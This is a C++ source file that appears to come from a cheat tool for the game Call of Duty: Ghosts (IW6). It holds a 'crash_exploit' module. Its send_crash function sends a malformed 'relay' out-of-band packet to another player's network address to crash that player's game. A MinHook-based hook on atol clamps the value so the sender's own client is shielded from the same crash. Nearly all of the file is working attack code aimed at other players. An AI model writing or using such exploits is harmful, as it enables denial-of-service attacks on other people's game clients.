//=====================================================================================

#include "../../StdAfx.hpp"

//=====================================================================================

#define AttachHook(original, hook, tramp) (MH_Initialize(), MH_CreateHook((LPVOID)original, (LPVOID)hook, (LPVOID*)&tramp), MH_EnableHook((LPVOID)original))
#define DetachHook(original) (MH_DisableHook((LPVOID)original), MH_RemoveHook((LPVOID)original), MH_Uninitialize())

//=====================================================================================

namespace NeoGenesys
{
	namespace crash_exploit
	{
		int atol_CL_HandleRelayPacket(const char* str)
		{
			return _ReturnAddress() == (LPVOID)iw6::offsets::atol_CL_HandleRelayPacketRet ? min(std::atol(str), 17ul) : std::atol(str);
		}
		/*
		//=====================================================================================
		*/
		void init()
		{
			AttachHook(iw6::offsets::atol_CL_HandleRelayPacket, atol_CL_HandleRelayPacket, iw6::atol_CL_HandleRelayPacket);
		}
		/*
		//=====================================================================================
		*/
		void free()
		{
			DetachHook(iw6::offsets::atol_CL_HandleRelayPacket);
		}
		/*
		//=====================================================================================
		*/
		void send_crash(int client_num)
		{
			char buf[2048];

			msg_t msg;
			iw6::MSG_Init(&msg, buf, sizeof buf);
			iw6::MSG_WriteString(&msg, "relay 1 1234567890");

			netadr_s netadr;
			GetPlayerAddr((sNetAddr*)&netadr, (SessionData*)GetCurrentSession(), client_num);
			iw6::NET_OutOfBandData(netsrc_t::NS_CLIENT1, netadr, msg.data, msg.cursize);
		}
		/*
		//=====================================================================================
		*/
		bool send_connectivity_test(int client_num)
		{
			if (const auto our_client_num = iw6::Party_FindMemberByXUID((SessionData*)GetCurrentSession(), iw6::Live_GetXuid((ControllerIndex_t)0)); our_client_num >= 0)
			{
				char buf[2048];
				msg_t msg;

				iw6::MSG_Init(&msg, buf, sizeof buf);
				iw6::MSG_WriteString(&msg, "vt");
				iw6::MSG_WriteByte(&msg, our_client_num);
				iw6::CL_SendPeerData((SessionData*)GetCurrentSession(), 0, netsrc_t::NS_CLIENT1, client_num, &msg, 1);

				return iw6::CL_CanWeConnectToClient((SessionData*)GetCurrentSession(), our_client_num, client_num);
			}

			return false;
		}
	}
}

//=====================================================================================